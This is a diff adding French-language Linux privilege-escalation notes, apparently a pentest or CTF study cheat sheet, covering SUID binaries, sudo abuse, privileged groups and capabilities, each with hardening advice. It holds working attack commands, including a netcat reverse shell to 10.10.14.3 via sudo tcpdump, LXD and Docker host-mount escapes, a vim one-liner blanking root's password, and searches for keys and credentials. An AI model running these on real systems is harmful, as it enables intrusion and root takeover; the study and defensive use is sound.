@@ -577,3 +577,217 @@ shell
 
 ---
 
+# Permissions-based Privilege Escalation
+
+---
+
+# Special Permissions (SUID / SGID) 
+
+## Objectif
+Identifier les fichiers avec bits `setuid` / `setgid`, comprendre rapidement les vecteurs d'exploitation courants (binaires abuseables, scripts mal protégés) et vérifier si un gain de privilèges est possible.
+
+## 1) Trouver les fichiers SUID / SGID
+`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`  → SUID (setuid)  
+`find / -uid 0 -perm -6000 -type f 2>/dev/null` → SUID ou SGID combinés
+
+Exemple de sortie utile :  
+`-rwsr-xr-x 1 root root ... /usr/bin/sudo`  
+(`s` dans les permissions indique SUID/SGID)
+
+## 2) Vérifier rapidement les candidats intéressants
+Chercher binaires non standards dans `/home`, `/opt` :  
+`find /home /opt -type f -perm -4000 2>/dev/null`
+
+Priorité d’analyse : binaires custom, programmes avec accès à l’I/O, binaires qui exécutent commandes externes ou chargent librairies.
+
+## 3) Méthodes d’exploitation courantes
+- **Utiliser des fonctionnalités du binaire** (ex. `apt-get -o APT::Update::Pre-Invoke::=/bin/sh` via `sudo`-like binaires) — voir GTFOBins.  
+- **LD_PRELOAD / library hijacking** si binaire exécute `dlopen` (attention : protections modernes).  
+- **Abuser d’options/arguments** permettant d’exécuter une commande ou d’écrire un fichier (ex : apt, pkexec mal configuré).  
+- **Remplacer fichiers utilisés par le binaire** (config, plugin) si permissions permissives.  
+- **Reverse engineer / fuzz** un binaire SUID pour trouver overflow (option lourde — contexte CTF / audit).
+
+Exemple simple (GTFOBins style) :  
+`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` → shell root (si `apt-get` est SUID ou lancé via sudo sans mot de passe).
+
+## 4) Vérifications rapides avant exploitation
+- `strings <binaire> | egrep -i "exec|system|popen|dlopen|LD_PRELOAD"`  
+- `ldd <binaire>` → dépendances (attention à setuid : `ldd` peut être risqué sur SUID)  
+- `stat <binaire>` → propriétaire, timestamps, ACLs  
+- Permissions du répertoire parent : `ls -ld $(dirname /chemin/vers/binaire)`
+
+## 5) Défense / durcissement
+- Éviter SUID sur binaires non essentiels.  
+- Restreindre écriture sur répertoires contenant binaires SUID.  
+- Surveiller changements de permissions : `auditd`/tripwire.  
+- Préférer capacités POSIX (file capabilities) bien contrôlées plutôt que SUID quand possible.
+
+---
+
+# Sudo Rights Abuse
+
+## Objectif
+Détecter des droits `sudo` abusifs (surtout `NOPASSWD`) et exploiter des commandes autorisées pour obtenir un shell root ou exécuter du code privilégié — rapidement et de façon répétable.
+
+## 1) Vérifier les droits sudo
+`sudo -l` → lister ce que l’utilisateur peut exécuter (les entrées `NOPASSWD` sont visibles sans mot de passe).
+
+Exemple :  
+`(root) NOPASSWD: /usr/sbin/tcpdump`
+
+## 2) Principes d’exploitation rapides
+- Si un binaire listé accepte des **options** qui permettent d’exécuter une commande ou un script (ex. `--pre-invoke`, `--postrotate`, `--eval`, `-c`, `-z`...), on peut l’abuser.  
+- Si la commande est appelée sans chemin absolu dans sudoers → **PATH abuse** possible.  
+- Si la commande lit/exécute des fichiers contrôlables par l’utilisateur → remplacer par script/shell.
+
+Toujours regarder la `man` du binaire (`man <binaire>`) pour options dangereuses.
+
+## 3) Exemple concret (tcpdump `-z` postrotate)
+- Créer le script à exécuter en postrotate :  
+  `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f' > /tmp/.test && chmod +x /tmp/.test`
+
+- Lancer tcpdump via sudo (exploitable si autorisé) :  
+  `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`
+
+- Écouter la connexion reverse shell :  
+  `nc -lnvp 443`
+
+Résultat : shell root (si l’option permet d’exécuter le script).
+
+## 4) Vérifs pré-exploit rapides
+- `sudo -l` → confirmer `NOPASSWD` et la commande exacte.  
+- `man <binaire>` → chercher options `-z`, `--pre-invoke`, `--postrotate`, `-c`, `--eval`, etc.  
+- `which <binaire>` / vérifier chemin absolu dans sudoers.  
+- Vérifier si l’utilisateur peut écrire le fichier passé en argument (ex : `/tmp/.test`).
+
+## 5) Défenses & bonnes pratiques (admin)
+1. **Préciser chemins absolus** dans `/etc/sudoers` (`/usr/bin/foo` plutôt que `foo`).  
+2. **Éviter `NOPASSWD: ALL`** ; limiter aux commandes strictement nécessaires.  
+3. Restreindre options dangereuses via wrappers ou ACLs.  
+4. Surveiller et auditer modifications sudoers et exécutions `sudo`.  
+5. Appliquer AppArmor/SELinux pour limiter ce que les options comme `-z` peuvent appeler.
+
+---
+
+# Privileged Groups
+
+## Objectif
+Rappels rapides : vérifier l'appartenance à des groupes « privilégiés » (lxd, docker, disk, adm, etc.), comprendre l'impact et méthodes rapides d'exploitation / vérifications — concis.
+
+## 1) Vérifier membership
+`id`  
+`groups`  
+`getent group lxd docker disk adm`
+
+## 2) LXD / LXC (impact élevé)
+- Condition : utilisateur dans le groupe `lxd`.
+- Risque : créer container privilégié et monter le système hôte → root sur l’hôte depuis le container.
+
+Vérifs rapides :
+- `id | grep lxd`
+- `lxc --version` (si installé)
+
+Exemple d’enchaînement condensé :
+- importer image : `lxc image import alpine.tar.gz --alias alpine`  
+- créer container privilégié : `lxc init alpine r00t -c security.privileged=true`  
+- monter racine hôte : `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`  
+- démarrer & exécuter shell : `lxc start r00t` → `lxc exec r00t -- /bin/sh` → `cd /mnt/root`
+
+Remarque : nécessite accès au socket LXD local (généralement autorisé pour membres `lxd`).
+
+## 3) Docker (impact élevé)
+- Condition : utilisateur dans le groupe `docker`.
+- Risque : lancer un conteneur avec un volume pointant vers `/` ou `/root` → accès hôte.
+
+Exploitation rapide :
+- `docker run -v /root:/mnt -it --rm alpine sh` → puis `ls /mnt` (récupérer clefs/ etc.)
+
+Remarque : docker group = quasi-root. Vérifier : `docker ps` fonctionne sans sudo.
+
+## 4) disk group (accès périphériques block)
+- Condition : membre du groupe `disk`.
+- Risque : accès raw disque (ex. `/dev/sda`) → lecture offline du filesystem, récupération de clefs, /etc/shadow, etc.
+
+Outils / actions :
+- monter image (si permissions) ou utiliser `debugfs` : `debugfs -R 'ls' /dev/sda1` (attention risques et besoin de connaissances)
+- copier périphérique : `dd if=/dev/sda of=/tmp/disk.img bs=1M` (si permis)
+
+## 5) adm group (logs)
+- Condition : membre du groupe `adm`.
+- Permet : lecture de `/var/log/*` (journaux système, applis) → recherche de creds, tokens, cron jobs, commandes récentes.
+
+Recherches rapides :
+- `ls -l /var/log`  
+- `grep -Ri "password\|passwd\|token\|ssh" /var/log 2>/dev/null`  
+- `journalctl --since "1 day ago"` (si accessible)
+
+## 6) Bonnes pratiques d’analyse (quick wins)
+- Toujours commencer par : `id`, `groups`, `sudo -l`  
+- Chercher fichiers/dirs montables ou scripts exécutés par des services : `find / -perm -4000 -type f 2>/dev/null`  
+- Rechercher clés SSH et fichiers sensibles : `find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null`  
+- Examiner `/etc/group` pour membres inattendus : `getent group docker lxd disk adm`
+
+## 7) Défenses / recommandations admin (rapide)
+- Ne pas ajouter d’utilisateurs non-trustés aux groupes `docker` / `lxd` / `disk`.  
+- Restreindre accès aux sockets (ex. `/var/snap/lxd/common/lxd/unix.socket`) et démon Docker.  
+- Eviter d’exposer Docker/LXD au réseau ; utiliser contrôles d’accès.  
+- Surveiller et alerter sur ajouts aux groupes privilégiés (auditd / SIEM).  
+- Préférer politiques RBAC et gestion centralisée (e.g., non-possession des droits root via groupe).
+
+---
+
+# Capabilities 
+
+## Objectif
+Identifier vite les **Linux capabilities** attribuées aux binaires, comprendre les capacités dangereuses et les vecteurs d'exploitation/prévention — format minimal pour copy/paste.
+
+## 1) Rappel
+- Les capabilities donnent à un binaire des droits précis sans être `root` (ex : `cap_net_bind_service` permet de binder des ports <1024).  
+- Valeurs usuelles : `=`, `+ep`, `+ei`, `+p`.  
+  - `+ep` → effective + permitted (usage courant pour exécution avec capability).  
+  - `+ei` → effective + inheritable (enfants héritent).  
+
+## 2) Caps dangereuses à repérer (exemples)
+- `cap_sys_admin` — très puissant (quasi-root).  
+- `cap_dac_override` — bypass des checks de permissions (lecture/écriture de fichiers protégés).  
+- `cap_setuid` / `cap_setgid` — changer UID/GID.  
+- `cap_sys_ptrace` — attacher/déboguer autres processus.  
+- `cap_net_raw` / `cap_net_bind_service` — sniffing / bind ports.
+
+## 3) Énumération rapide (one-liners)
+- Lister capabilities sur répertoires usuels :  
+  `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null`  
+- Tester une capability sur un fichier :  
+  `getcap /path/to/binary`  
+- Voir capabilities actives d’un processus (si `capsh`/proc) :  
+  `cat /proc/<pid>/status | egrep Cap|tr '\n' ' '` (plus d’analyse nécessaire)
+
+
+## 4) Ajouter/retirer une capability (admin)
+- Ajouter : `sudo setcap cap_net_bind_service=+ep /usr/bin/myprog`  
+- Enlever : `sudo setcap -r /usr/bin/myprog`  
+- Vérifier : `getcap /usr/bin/myprog`
+
+## 5) Exploits pratiques (exemples courts)
+- **`cap_dac_override` + éditeur**  
+  - Si `getcap /usr/bin/vim.basic` → `/usr/bin/vim.basic cap_dac_override=eip`  
+  - Éditer `/etc/passwd` : `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`  
+  - Conséquence : suppression du hash → `su root` sans mot de passe *(danger réel, démonstratif)*.
+
+- **Général** : tout binaire permettant d'écrire/éxecuter fichiers ou d'ouvrir devices avec une capability d'override est une cible (ex : écrire clefs SSH, modifier `/etc/sudoers`, monter FS si `cap_sys_admin`).
+
+## 6) Vérifs avant exploitation
+- `getcap <binaire>` confirmé.  
+- Le binaire est-il **sûr** (interactif, sandboxé) ? `strings <binaire>` pour trouver options d’IO.  
+- L’utilisateur peut-il lancer le binaire directement ? (permissions).  
+- Y a-t-il des protections (AppArmor/SELinux) limitant le comportement du binaire ?
+
+## 7) Mitigation / bonnes pratiques (admin)
+- Minimiser capabilities : préférer drop de caps et utiliser des services sandboxés.  
+- Ne pas donner `cap_sys_admin` / `cap_dac_override` à des binaires exposés aux utilisateurs.  
+- Surveiller modifications de capabilities (`auditd`, intégrité des fichiers).  
+- Utiliser `setcap -r` pour retirer caps inutiles et privilégier utilisateurs/UID restreints.
+
+## 8) Ressource utile
+- [getcap / setcap (man)](https://man7.org/linux/man-pages/man8/setcap.8.html)  
+
